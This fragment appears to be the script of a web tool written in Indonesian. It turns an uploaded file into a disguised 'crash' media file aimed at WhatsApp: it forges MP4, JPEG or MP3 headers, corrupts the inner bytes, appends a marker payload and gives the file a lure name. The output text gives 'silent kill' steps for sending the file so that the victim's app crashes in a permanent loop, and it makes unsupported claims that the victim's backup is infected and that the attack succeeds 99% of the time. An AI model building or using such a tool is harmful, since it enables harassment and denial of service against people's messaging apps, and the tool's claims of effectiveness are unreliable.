<body>

  <script>
    document.getElementById('fileType').addEventListener('change', function() {
      const type = this.value;
      const names = {
        'video': 'DARI_PACAR.mp4',
        'image': 'CEK_GAMBAR_DONG.jpg',
        'audio': 'SUARA_KAMU_LOHING.mp3'
      };

    });

    function generateFinalPayload() {
      const file = document.getElementById('inputFile').files[0];
      const fileType = document.getElementById('fileType').value;
      const customName = document.getElementById('customName').value.trim() || "video.mp4";

      if (!file) return alert("‚ö†Ô∏è Pilih file dulu!");

      const reader = new FileReader();
      reader.onload = function(e) {
        let arr = new Uint8Array(e.target.result);

        // === 1. Fix Header agar terlihat normal ===
        if (fileType === "video") {
          // MP4 header: ftyp
          if (arr.length > 10) {
            arr[0] = 0x00; arr[1] = 0x00; arr[2] = 0x00; arr[3] = 0x18;
            arr[4] = 0x66; arr[5] = 0x74; arr[6] = 0x79; arr[7] = 0x70;
          }
        } else if (fileType === "image") {
          // JPEG header: SOI + APP0
          if (arr.length > 10) {
            arr[0] = 0xFF; arr[1] = 0xD8; arr[2] = 0xFF; arr[3] = 0xE0;
          }
        } else if (fileType === "audio") {
          // MP3 dummy header
          if (arr.length > 10) {
            arr[0] = 0x49; arr[1] = 0x44; arr[2] = 0x33; // ID3 tag
          }
        }

        // === 2. Corrupt bagian dalam (parser crash) ===
        for (let i = 50; i < 150; i++) {
          if (i % 4 === 0) arr[i] = 0xFF;
          if (i % 3 === 0) arr[i] = 0x00;
        }

        // === 3. Inject payload akhir (infeksi backup) ===
        const payload = [0xDE, 0xAD, 0xC0, 0xDE, 0x13, 0x37];
        payload.forEach((val, idx) => {
          const pos = arr.length - (10 + idx);
          if (pos > 0) arr[pos] = val;
        });

        // === 4. Tentukan MIME type ===
        let mimeType = "video/mp4";
        if (fileType === "image") mimeType = "image/jpeg";
        if (fileType === "audio") mimeType = "audio/mpeg";

        const finalBlob = new Blob([arr], { type: mimeType });
        const url = URL.createObjectURL(finalBlob);

        // === 5. Download file hasil ===
        const a = document.createElement('a');
        a.href = url;
        a.download = customName;
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);

        // === 6. Tampilkan hasil ===
        document.getElementById('result').textContent = `
‚úÖ FILE "${customName}" SIAP KIRIM!

üéØ STRATEGI SILENT KILL:

1. Kirim file ini lewat tombol üìé ‚Üí Gallery (bukan Dokumen)

4. Setiap buka WA ‚Üí crash lagi ‚Üí loop permanen
5. Backup terinfeksi ‚Üí reinstall tetap mati

üíÄ TIDAK PERLU KORBAN KLIK / EKSTRAK / BUKA
‚ò†Ô∏è TARGET AKAN KEHILANGAN WA SELAMANYA

üî• 99% BERHASIL DI WA VERSI 2.25.23.11
        `;
      };
      reader.readAsArrayBuffer(file);
    }
